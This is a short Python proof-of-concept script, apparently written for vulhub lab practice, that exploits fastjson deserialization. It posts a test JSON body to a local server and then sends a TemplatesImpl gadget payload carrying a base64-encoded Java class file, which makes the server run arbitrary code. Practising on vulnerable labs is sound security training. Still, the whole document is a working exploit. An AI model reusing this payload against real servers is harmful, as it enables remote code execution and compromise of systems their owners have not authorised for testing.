import requests
import base64

url = "http://192.168.2.168:8080"
data =  "{\"name\":\"feifei\",age:12}"

testing_1 = requests.post(url,data=data)
test = testing_1.text
if "\"success\":200" in test:
    print("存在fastjson反序列化导致任意命令执行漏洞")
with open("C:\\Users\\吴适怀\\Desktop\\网信\\漏洞训练\\vulhub\\fastjson\\vuln\\Test.class",'rb') as f:
    java_str = f.read()
str1 =  base64.b64encode(java_str).decode()
poc = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\""+str1+"\"],\"_name\":\"a.b\",\"_tfactory\":{ },\"_outputProperties\":{ },\"_version\":\"1.0\",\"allowedProtocols\":\"all\"},age:12}"
#{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["
testing = requests.post(url,data=poc)
